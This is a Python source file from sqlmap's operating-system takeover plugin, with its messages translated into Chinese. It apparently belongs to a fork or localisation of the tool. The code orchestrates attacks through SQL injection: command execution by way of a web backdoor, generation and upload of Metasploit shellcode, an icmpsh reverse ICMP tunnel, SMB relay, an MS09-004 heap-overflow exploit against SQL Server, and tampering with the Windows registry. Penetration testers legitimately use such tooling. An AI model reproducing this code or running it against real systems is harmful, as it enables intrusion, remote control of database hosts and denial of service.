#!/usr/bin/env python
#coding=utf-8
"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import os

from lib.core.common import Backend
from lib.core.common import isStackingAvailable
from lib.core.common import readInput
from lib.core.common import runningAsAdmin
from lib.core.data import conf
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.exception import SqlmapFilePathException
from lib.core.exception import SqlmapMissingDependence
from lib.core.exception import SqlmapMissingMandatoryOptionException
from lib.core.exception import SqlmapMissingPrivileges
from lib.core.exception import SqlmapNotVulnerableException
from lib.core.exception import SqlmapUndefinedMethod
from lib.core.exception import SqlmapUnsupportedDBMSException
from lib.takeover.abstraction import Abstraction
from lib.takeover.icmpsh import ICMPsh
from lib.takeover.metasploit import Metasploit
from lib.takeover.registry import Registry

from plugins.generic.misc import Miscellaneous

class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
    """
    该类定义了插件的通用操作系统接管功能.
    """

    def __init__(self):
        self.cmdTblName = "sqlmapoutput"
        self.tblField = "data"

        Abstraction.__init__(self)

    def osCmd(self):
        if isStackingAvailable() or conf.direct:
            web = False
        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
            infoMsg = "将使用一个web后门进行命令执行"
            logger.info(infoMsg)

            web = True
        else:
            errMsg = "无法通过后端DBMS执行操作系统命令"
            raise SqlmapNotVulnerableException(errMsg)

        self.getRemoteTempPath()
        self.initEnv(web=web)

        if not web or (web and self.webBackdoorUrl is not None):
            self.runCmd(conf.osCmd)

        if not conf.osShell and not conf.osPwn and not conf.cleanup:
            self.cleanup(web=web)

    def osShell(self):
        if isStackingAvailable() or conf.direct:
            web = False
        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
            infoMsg = "将使用一个web后门的命令提示符"
            logger.info(infoMsg)

            web = True
        else:
            errMsg = "无法通过后端DBMS提示交互式操作系统shell，因为不支持堆叠(多语句)查询SQL注入"
            raise SqlmapNotVulnerableException(errMsg)

        self.getRemoteTempPath()
        self.initEnv(web=web)

        if not web or (web and self.webBackdoorUrl is not None):
            self.shell()

        if not conf.osPwn and not conf.cleanup:
            self.cleanup(web=web)

    def osPwn(self):
        goUdf = False
        fallbackToWeb = False
        setupSuccess = False

        self.checkDbmsOs()

        if Backend.isOs(OS.WINDOWS):
            msg = "你想如何建立隧道？?"
            msg += "\n[1] TCP: Metasploit Framework (default)"
            msg += "\n[2] ICMP: icmpsh - ICMP tunneling"

            while True:
                tunnel = readInput(msg, default='1')

                if tunnel.isdigit() and int(tunnel) in (1, 2):
                    tunnel = int(tunnel)
                    break

                else:
                    warnMsg = "无效值，有效值为'1'和'2'"
                    logger.warn(warnMsg)
        else:
            tunnel = 1

            debugMsg = "当后端DBMS不是Windows时，隧道只能通过TCP建立"
            logger.debug(debugMsg)

        if tunnel == 2:
            isAdmin = runningAsAdmin()

            if not isAdmin:
                errMsg = "如果要建立带外ICMP隧道，则需要以管理员身份运行sqlmap，因为icmpsh使用原始套接字来嗅探和制作ICMP数据包"
                raise SqlmapMissingPrivileges(errMsg)

            try:
                from impacket import ImpactDecoder
                from impacket import ImpactPacket
            except ImportError:
                errMsg = "sqlmap需要“python-impacket”第三方库才能运行icmpsh master。"
                errMsg += "您可以访问http://code.google.com/p/impacket/downloads/list"
                raise SqlmapMissingDependence(errMsg)

            sysIgnoreIcmp = "/proc/sys/net/ipv4/icmp_echo_ignore_all"

            if os.path.exists(sysIgnoreIcmp):
                fp = open(sysIgnoreIcmp, "wb")
                fp.write("1")
                fp.close()
            else:
                errMsg = "您需要在整个系统范围内禁用ICMP回复 "
                errMsg += "例如在Linux/Unix上运行:\n"
                errMsg += "# sysctl -w net.ipv4.icmp_echo_ignore_all=1\n"
                errMsg += "如果您错过了这么做，您将收到来自数据库服务器的信息，而不会收到您发送的命令的回应。"
                logger.error(errMsg)

            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                self.sysUdfs.pop("sys_bineval")

        self.getRemoteTempPath()

        if isStackingAvailable() or conf.direct:
            web = False

            self.initEnv(web=web)

            if tunnel == 1:
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                    msg = "您打算如何在底层操作系统的底层数据库上执行Metasploit shellcode？"
                    msg += "\n[1] 通过UDF 'sys_bineval' (内存方式，反取证，默认)"
                    msg += "\n[2] 通过shellcodeexec(文件系统方式，首选64位系统)"

                    while True:
                        choice = readInput(msg, default='1')

                        if choice.isdigit() and int(choice) in (1, 2):
                            choice = int(choice)
                            break

                        else:
                            warnMsg = "无效值，有效值为1和2"
                            logger.warn(warnMsg)

                    if choice == 1:
                        goUdf = True

                if goUdf:
                    exitfunc = "thread"
                    setupSuccess = True
                else:
                    exitfunc = "process"

                self.createMsfShellcode(exitfunc=exitfunc, format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")

                if not goUdf:
                    setupSuccess = self.uploadShellcodeexec(web=web)

                    if setupSuccess is not True:
                        if Backend.isDbms(DBMS.MYSQL):
                            fallbackToWeb = True
                        else:
                            msg = "无法挂载操作系统接管"
                            raise SqlmapFilePathException(msg)

                if Backend.isOs(OS.WINDOWS) and Backend.isDbms(DBMS.MYSQL) and conf.privEsc:
                    debugMsg = "默认情况下，MySQL在Windows上运行为SYSTEM用户，不需要权限升级"
                    logger.debug(debugMsg)

            elif tunnel == 2:
                setupSuccess = self.uploadIcmpshSlave(web=web)

                if setupSuccess is not True:
                    if Backend.isDbms(DBMS.MYSQL):
                        fallbackToWeb = True
                    else:
                        msg = "无法挂载操作系统接管"
                        raise SqlmapFilePathException(msg)

        if not setupSuccess and Backend.isDbms(DBMS.MYSQL) and not conf.direct and (not isStackingAvailable() or fallbackToWeb):
            web = True

            if fallbackToWeb:
                infoMsg = "falling back to web backdoor to establish the tunnel"
            else:
                infoMsg = "要使用web后门建立隧道"
            logger.info(infoMsg)

            self.initEnv(web=web, forceInit=fallbackToWeb)

            if self.webBackdoorUrl:
                if not Backend.isOs(OS.WINDOWS) and conf.privEsc:
                    #Unset --priv-esc如果后端DBMS底层操作系统不是Windows
                    conf.privEsc = False

                    warnMsg = "当后台DBMS底层系统不是Windows时，sqlmap不实现任何操作系统用户权限升级技术"
                    logger.warn(warnMsg)

                if tunnel == 1:
                    self.createMsfShellcode(exitfunc="process", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
                    setupSuccess = self.uploadShellcodeexec(web=web)

                    if setupSuccess is not True:
                        msg = "无法挂载操作系统接管"
                        raise SqlmapFilePathException(msg)

                elif tunnel == 2:
                    setupSuccess = self.uploadIcmpshSlave(web=web)

                    if setupSuccess is not True:
                        msg = "无法挂载操作系统接管"
                        raise SqlmapFilePathException(msg)

        if setupSuccess:
            if tunnel == 1:
                self.pwn(goUdf)
            elif tunnel == 2:
                self.icmpPwn()
        else:
            errMsg = "unable to prompt for an out-of-band session"
            raise SqlmapNotVulnerableException(errMsg)

        if not conf.cleanup:
            self.cleanup(web=web)

    def osSmb(self):
        self.checkDbmsOs()

        if not Backend.isOs(OS.WINDOWS):
            errMsg = "后端DBMS底层操作系统不是Windows：不可能执行SMB中继攻击"
            raise SqlmapUnsupportedDBMSException(errMsg)

        if not isStackingAvailable() and not conf.direct:
            if Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.MSSQL):
                errMsg = "在这个后端DBMS中，只有支持堆叠(多语句)查询才可能执行SMB中继攻击"
                raise SqlmapUnsupportedDBMSException(errMsg)

            elif Backend.isDbms(DBMS.MYSQL):
                debugMsg = "由于不支持堆叠查询，sqlmap将通过推测SQL盲注入执行SMB中继攻击"
                logger.debug(debugMsg)

        printWarn = True
        warnMsg = "这次攻击不太可能成功 "

        if Backend.isDbms(DBMS.MYSQL):
            warnMsg += "因为默认情况下，MySQL在Windows上运行的本地系统不是真正的用户，它在连接到SMB服务时不会发送NTLM会话哈希session hash"

        elif Backend.isDbms(DBMS.PGSQL):
            warnMsg += "因为默认情况下PostgreSQL作为postgres用户运行，该用户是系统的真正用户，但不在Administrators组内"

        elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
            warnMsg += "因为通常Microsoft SQL Server %s 作为网络服务运行，而不是真正的用户，它在连接到SMB服务时不发送NTLM会话哈希" % Backend.getVersion()
        else:
            printWarn = False

        if printWarn:
            logger.warn(warnMsg)

        self.smb()

    def osBof(self):
        if not isStackingAvailable() and not conf.direct:
            return

        if not Backend.isDbms(DBMS.MSSQL) or not Backend.isVersionWithin(("2000", "2005")):
            errMsg = "后端DBMS必须是Microsoft SQL Server 2000或2005才能够利用“sp_replwritetovarbin”存储过程（MS09-004）中基于堆的缓冲区溢出"
            raise SqlmapUnsupportedDBMSException(errMsg)

        infoMsg = "将利用Microsoft SQL Server %s“sp_replwritetovarbin”存储过程基于堆的缓冲区溢出（MS09-004）"
        logger.info(infoMsg)

        msg = "这种技术很可能是DoS的DBMS过程，你确定要利用这个漏洞? [y/N] "

        if readInput(msg, default='N', boolean=True):
            self.initEnv(mandatory=False, detailed=True)
            self.getRemoteTempPath()
            self.createMsfShellcode(exitfunc="seh", format="raw", extra="-b 27", encode=True)
            self.bof()

    def uncPathRequest(self):
        errMsg = "必须将“uncPathRequest”方法定义到特定的DBMS插件中"
        raise SqlmapUndefinedMethod(errMsg)

    def _regInit(self):
        if not isStackingAvailable() and not conf.direct:
            return

        self.checkDbmsOs()

        if not Backend.isOs(OS.WINDOWS):
            errMsg = "后端DBMS底层操作系统不是Windows"
            raise SqlmapUnsupportedDBMSException(errMsg)

        self.initEnv()
        self.getRemoteTempPath()

    def regRead(self):
        self._regInit()

        if not conf.regKey:
            default = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
            msg = "您要读取哪个注册表项? [%s] " % default
            regKey = readInput(msg, default=default)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            default = "ProductName"
            msg = "您要读取哪个注册表项值? [%s] " % default
            regVal = readInput(msg, default=default)
        else:
            regVal = conf.regVal

        infoMsg = "读取Windows注册表路径 '%s\%s' " % (regKey, regVal)
        logger.info(infoMsg)

        return self.readRegKey(regKey, regVal, True)

    def regAdd(self):
        self._regInit()

        errMsg = "缺少必需的参数"

        if not conf.regKey:
            msg = "你要写入哪个注册表项? "
            regKey = readInput(msg)

            if not regKey:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg = "你要写哪个注册表项值? "
            regVal = readInput(msg)

            if not regVal:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        if not conf.regData:
            msg = "您要写入哪个注册表项值数据? "
            regData = readInput(msg)

            if not regData:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regData = conf.regData

        if not conf.regType:
            default = "REG_SZ"
            msg = "which registry key value data-type is it? "
            msg += "[%s] " % default
            regType = readInput(msg, default=default)
        else:
            regType = conf.regType

        infoMsg = "添加Windows注册表路径 '%s\%s' " % (regKey, regVal)
        infoMsg += "与数据 '%s'. " % regData
        infoMsg += "只有运行数据库进程的用户有权修改Windows注册表时，这才有效。."
        logger.info(infoMsg)

        self.addRegKey(regKey, regVal, regType, regData)

    def regDel(self):
        self._regInit()

        errMsg = "缺少必须的参数"

        if not conf.regKey:
            msg = "您要删除哪个注册表项？? "
            regKey = readInput(msg)

            if not regKey:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg = "要删除哪个注册表项值? "
            regVal = readInput(msg)

            if not regVal:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        message = "你确定要删除Windows注册表路径 '%s\%s? [y/N] " % (regKey, regVal)

        if not readInput(message, default='N', boolean=True):
            return

        infoMsg = "删除Windows注册表路径 '%s\%s'. " % (regKey, regVal)
        infoMsg += "只有运行数据库进程的用户有权修改Windows注册表时，这才有效."
        logger.info(infoMsg)

        self.delRegKey(regKey, regVal)
